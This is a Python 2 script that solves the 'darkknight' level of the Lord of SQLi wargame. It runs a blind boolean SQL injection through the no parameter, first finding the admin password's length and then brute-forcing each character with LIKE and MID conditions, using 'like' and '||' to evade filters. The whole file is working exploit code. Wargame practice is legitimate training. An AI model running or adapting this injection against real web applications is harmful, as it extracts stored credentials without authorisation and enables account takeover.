#-*- coding: utf-8 -*-
import urllib2, urllib, string
from web import *

url = "http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?&no={}"

# get length
inject_url = '0 or id like "admin" and length(pw) like {}'
for i in range(1, 100):
    req = getRequest(url,inject_url.format(i), show=False)
    page = getPage(req)
    if "Hello admin" in page:
        length = i
        break

print "Length :",length

# get password : brute forcing
password = ""
inject_url = '0 || id like "admin" and mid(pw,{},1) like "{}"'
for i in range(1,length+1):
    for c in string.digits + string.letters:
        req = getRequest(url, inject_url.format(i,c),show=False)
        page = getPage(req)
        if "Hello admin" in page:
            print i,"'th letter is",c
            password += c
            break

print "Password :",password
